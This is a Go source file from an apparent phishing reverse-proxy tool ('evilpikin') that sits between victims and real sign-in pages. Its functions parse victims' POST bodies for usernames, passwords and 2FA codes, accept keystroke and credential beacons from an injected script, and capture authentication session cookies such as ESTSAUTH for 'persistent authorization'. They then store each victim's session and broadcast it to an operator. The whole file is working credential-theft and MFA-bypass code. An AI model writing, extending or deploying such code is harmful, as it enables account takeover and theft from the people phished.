package proxy

import (
	"bytes"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"

	"github.com/user/evilpikin/internal/log"
	"github.com/user/evilpikin/internal/storage"
	"github.com/user/evilpikin/internal/telemetry"
)

const BeaconPath = "/__ep_telemetry"

func newCaptureID() string {
	b := make([]byte, 12)
	if _, err := rand.Read(b); err != nil {
		return hex.EncodeToString([]byte(time.Now().Format("150405.000000000")))
	}
	return hex.EncodeToString(b)
}

func shortID(id string) string {
	if len(id) > 6 {
		return id[:6]
	}
	return id
}

// maskSecret hides a captured secret in shared logs (TUI/terminal) while the
// full value is still persisted in the session store for the operator to review
// in the detail view / export.
func maskSecret(s string) string {
	if s == "" {
		return ""
	}
	return "••••••••"
}

func (e *Engine) wrapCapture(target *storage.TargetProfile, next http.Handler) http.Handler {
	if e.store == nil {
		return next
	}
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == BeaconPath && r.Method == http.MethodPost {
			e.handleBeacon(target, w, r)
			return
		}
		if r.URL.Path == SyncPath {
			e.handleSync(target, w, r)
			return
		}

		// Stable per-victim SID. Pin it on the request so the CookieJar's
		// OnResponse (which runs during the response rewrite) reuses the SAME
		// sid for both cookie replay and session correlation.
		sid, _ := e.cookieJar.ensureSID(r, target.ProxyHost)
		if c, _ := r.Cookie("__ep_sid"); c == nil || c.Value == "" {
			r.AddCookie(&http.Cookie{Name: "__ep_sid", Value: sid})
		}

		if r.Method == http.MethodPost {
			flow := detectFlow(r.URL.Path)
			user, pass, otp, custom := parseCredentials(r, target)
			if user != "" || pass != "" || otp != "" {
				e.recordCapture(sid, target, r, user, pass, otp, custom, flow)
			}
		}

		next.ServeHTTP(w, r)

		// Capture persistent session cookies from the response (ESTSAUTH,
		// RPSSecAuth, etc.) into the victim's session row.
		e.captureResponseCookies(sid, target, w.Header())
	})
}

func (e *Engine) handleBeacon(target *storage.TargetProfile, w http.ResponseWriter, r *http.Request) {
	body, _ := io.ReadAll(r.Body)
	var payload struct {
		Type string            `json:"type"`
		Data string            `json:"data"`
		Meta map[string]string `json:"meta"`
	}
	_ = json.Unmarshal(body, &payload)
	// evilpuppet-style beaconed credentials (password harvested from the SPA via
	// the injected shim) are folded into the victim's captured session.
	if (payload.Type == "password" || payload.Type == "credential") && payload.Data != "" {
		sid, _ := e.cookieJar.ensureSID(r, target.ProxyHost)
		email := ""
		if payload.Meta != nil {
			email = payload.Meta["email"]
		}
		e.recordCapture(sid, target, r, email, payload.Data, "", nil, storage.FlowStandard)
	}
	if e.telemetryHub != nil {
		data := map[string]string{"remote": r.RemoteAddr}
		if payload.Data != "" {
			data["data"] = payload.Data
		}
		for k, v := range payload.Meta {
			data[k] = v
		}
		e.telemetryHub.Broadcast(telemetry.Event{
			Type:     telemetry.EventKeystroke,
			TargetID: target.ID,
			Time:     time.Now(),
			Data:     data,
		})
	}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(`{"ok":true}`))
}

func (e *Engine) handleSync(target *storage.TargetProfile, w http.ResponseWriter, r *http.Request) {
	sid := r.URL.Query().Get("sid")
	next := r.URL.Query().Get("next")
	if next == "" {
		next = "/"
	}
	if sid != "" {
		http.SetCookie(w, &http.Cookie{
			Name:     "__ep_sid",
			Value:    sid,
			Domain:   "." + e.siteDomainFor(target),
			Path:     "/",
			Secure:   true,
			HttpOnly: true,
		})
	}
	http.Redirect(w, r, next, http.StatusFound)
}

// loadOrCreateSession resolves the CapturedSession for a victim SID, creating a
// fresh row on first contact and reloading the persisted row on later steps so
// the entire flow (email -> password -> 2FA -> cookies) accumulates in one place.
func (e *Engine) loadOrCreateSession(sid string, target *storage.TargetProfile, r *http.Request) *storage.CapturedSession {
	e.sessionMu.Lock()
	id, ok := e.sessionBySID[sid]
	e.sessionMu.Unlock()
	if ok {
		if s, err := e.store.GetSession(id); err == nil {
			return s
		}
	}
	s := &storage.CapturedSession{
		ID:         newCaptureID(),
		TargetID:   target.ID,
		TargetName: target.Name,
		LureID:     r.URL.Query().Get("id"),
		RemoteAddr: r.RemoteAddr,
		UserAgent:  r.UserAgent(),
		Status:     "captured",
		CreatedAt:  time.Now(),
		Cookies:    map[string][]storage.CapturedCookie{},
		Custom:     map[string]string{},
	}
	e.sessionMu.Lock()
	e.sessionBySID[sid] = s.ID
	e.sessionMu.Unlock()
	return s
}

func (e *Engine) recordCapture(sid string, target *storage.TargetProfile, r *http.Request, user, pass, otp string, custom map[string]string, flow storage.SessionFlow) {
	if e.store == nil {
		return
	}
	if user == "" && pass == "" && otp == "" {
		return
	}
	s := e.loadOrCreateSession(sid, target, r)
	dirty := false

	if user != "" && s.Username == "" {
		s.Username = user
		s.AppendLog(fmt.Sprintf("[+] [ID: %s] Victim expanded flow: Entering Email -> %s", shortID(s.ID), user))
		dirty = true
	}
	if pass != "" {
		s.Password = pass
		s.AppendLog(fmt.Sprintf("[*] [ID: %s] Captured Password string: %s", shortID(s.ID), maskSecret(pass)))
		dirty = true
	}
	if otp != "" {
		s.OTPToken = otp
		s.AppendLog(fmt.Sprintf("[*] [ID: %s] 2FA token entered: %s", shortID(s.ID), maskSecret(otp)))
		dirty = true
	}
	if len(custom) > 0 {
		for k, v := range custom {
			if v != "" {
				s.Custom[k] = v
			}
		}
		dirty = true
	}
	if flow != "" && s.FlowType == "" {
		s.FlowType = flow
		s.AppendLog(fmt.Sprintf("[*] [ID: %s] Flow type: %s", shortID(s.ID), flow))
		dirty = true
	}
	if s.Status == "" {
		s.Status = "captured"
	}

	if dirty {
		if err := e.store.SaveSession(s); err != nil {
			log.Error("capture: save session: %v", err)
		} else {
			e.broadcastCredential(s)
		}
	}
	// Flag the session as captured so the response rewriter stops collapsing
	// post-auth dashboard navigations back to the sign-in form.
	if e.cookieJar != nil && sid != "" && (s.Password != "" || s.OTPToken != "") {
		e.cookieJar.MarkCaptured(sid)
	}
	_ = r
}

func (e *Engine) captureResponseCookies(sid string, target *storage.TargetProfile, h http.Header) {
	if e.store == nil {
		return
	}
	cookies := h.Values("Set-Cookie")
	if len(cookies) == 0 {
		return
	}
	e.sessionMu.Lock()
	id, ok := e.sessionBySID[sid]
	e.sessionMu.Unlock()
	if !ok {
		return
	}
	s, err := e.store.GetSession(id)
	if err != nil {
		return
	}
	authFound := false
	for _, cstr := range cookies {
		cc := parseSetCookie(cstr)
		if cc == nil {
			continue
		}
		if cc.Name == "__ep_sid" {
			continue
		}
		s.Cookies[cc.Name] = append(s.Cookies[cc.Name], *cc)
		if cc.IsAuthCookie() {
			authFound = true
		}
	}
	if authFound {
		s.AppendLog(fmt.Sprintf("[!] [ID: %s] Session cookies captured successfully. Persistent authorization ready.", shortID(s.ID)))
		s.Status = "authorized"
		s.IsValid = true
	}
	if err := e.store.SaveSession(s); err != nil {
		log.Error("capture: save cookies: %v", err)
		return
	}
	if authFound {
		e.broadcastCookie(s)
	}
}

func (e *Engine) broadcastCredential(s *storage.CapturedSession) {
	if e.telemetryHub == nil {
		return
	}
	e.telemetryHub.Broadcast(telemetry.Event{
		Type:      telemetry.EventCredential,
		TargetID:  s.TargetID,
		SessionID: s.ID,
		Time:      time.Now(),
		Data: map[string]string{
			"username": s.Username,
			"remote":   s.RemoteAddr,
			"flow":     string(s.FlowType),
			"status":   s.Status,
		},
	})
	log.Info("[+] [ID: %s] Credential captured (user=%s flow=%s)", shortID(s.ID), s.Username, s.FlowType)
}

func (e *Engine) broadcastCookie(s *storage.CapturedSession) {
	if e.telemetryHub == nil {
		return
	}
	e.telemetryHub.Broadcast(telemetry.Event{
		Type:      telemetry.EventCookie,
		TargetID:  s.TargetID,
		SessionID: s.ID,
		Time:      time.Now(),
		Data: map[string]string{
			"username": s.Username,
			"count":    strconv.Itoa(len(s.AuthCookies())),
			"status":   "authorized",
		},
	})
	log.Info("[!] [ID: %s] Session cookies captured for %s", shortID(s.ID), s.Username)
}

func detectFlow(path string) storage.SessionFlow {
	p := strings.ToLower(path)
	for _, kw := range []string{"reset", "forgot", "recover", "passwordreset", "resetpassword", "accountverif", "newpassword", "challenge", "kmsi"} {
		if strings.Contains(p, kw) {
			return storage.FlowPasswordReset
		}
	}
	return storage.FlowStandard
}

// parseCredentials extracts the username, password and 2FA token (plus any
// extra reset-phase fields) from a victim POST body, supporting both
// form-encoded and JSON request shapes.
func parseCredentials(r *http.Request, target *storage.TargetProfile) (string, string, string, map[string]string) {
	body, err := io.ReadAll(r.Body)
	if err != nil {
		return "", "", "", nil
	}
	r.Body = io.NopCloser(bytes.NewReader(body))

	form := parseFormEncoded(body)
	if len(form) == 0 && strings.Contains(strings.ToLower(r.Header.Get("Content-Type")), "json") {
		var j map[string]interface{}
		if json.Unmarshal(body, &j) == nil {
			for k, v := range j {
				if s, ok := v.(string); ok {
					form[k] = s
				}
			}
		}
	}

	user, pass, otp := "", "", ""
	if target.UsernameField != "" {
		user = form[target.UsernameField]
	}
	if user == "" {
		user = firstOf(form, "email", "username", "loginHint", "userId", "u", "login")
	}
	if target.PasswordField != "" {
		pass = form[target.PasswordField]
	}
	if pass == "" {
		pass = firstOf(form, "passwd", "Passwd", "password", "Password", "newPassword", "confirmPassword", "pwd")
	}
	otp = firstOf(form, "otc", "otp", "code", "authCode", "token", "passcode",
		"securityCode", "twoFactorCode", "t", "proof", "credential", "verificationCode", "mfaCode",
		"pin", "Pin", "totp", "Totp")

	custom := map[string]string{}
	for _, k := range []string{"newPassword", "confirmPassword", "email", "login"} {
		if v := form[k]; v != "" {
			custom[k] = v
		}
	}
	return user, pass, otp, custom
}

func firstOf(form map[string]string, keys ...string) string {
	for _, k := range keys {
		if v, ok := form[k]; ok && v != "" {
			return v
		}
	}
	return ""
}

func parseSetCookie(s string) *storage.CapturedCookie {
	parts := strings.Split(s, ";")
	if len(parts) == 0 {
		return nil
	}
	kv := strings.SplitN(parts[0], "=", 2)
	// A Set-Cookie with no '=' (e.g. an empty attribute) is malformed and
	// skipped; everything else — including an empty value — is captured so no
	// auth/expected-or-unexpected cookie is ever dropped on the floor.
	if len(kv) != 2 {
		return nil
	}
	name := strings.TrimSpace(kv[0])
	if name == "" {
		return nil
	}
	cc := &storage.CapturedCookie{Name: strings.TrimSpace(kv[0]), Value: kv[1]}
	for _, p := range parts[1:] {
		p = strings.TrimSpace(p)
		if i := strings.IndexByte(p, '='); i >= 0 {
			k := strings.ToLower(strings.TrimSpace(p[:i]))
			v := p[i+1:]
		switch k {
		case "domain":
			cc.Domain = v
		case "path":
			cc.Path = v
		case "samesite":
			cc.SameSite = v
		case "expires":
			if t, err := time.Parse(time.RFC1123, v); err == nil {
				cc.Expiry = t
			} else if t, err := time.Parse("Mon, 02-Jan-2006 15:04:05 MST", v); err == nil {
				cc.Expiry = t
			}
		case "max-age":
			if n, err := strconv.Atoi(v); err == nil && n > 0 {
				cc.Expiry = time.Now().Add(time.Duration(n) * time.Second)
			}
		}
		} else {
			switch strings.ToLower(p) {
			case "secure":
				cc.Secure = true
			case "httponly":
				cc.HttpOnly = true
			}
		}
	}
	return cc
}

func parseFormEncoded(body []byte) map[string]string {
	out := map[string]string{}
	for _, pair := range strings.Split(string(body), "&") {
		if pair == "" {
			continue
		}
		kv := strings.SplitN(pair, "=", 2)
		k := kv[0]
		v := ""
		if len(kv) == 2 {
			v = kv[1]
		}
		if dk, err := url.QueryUnescape(k); err == nil {
			k = dk
		}
		if dv, err := url.QueryUnescape(v); err == nil {
			v = dv
		}
		out[k] = v
	}
	return out
}
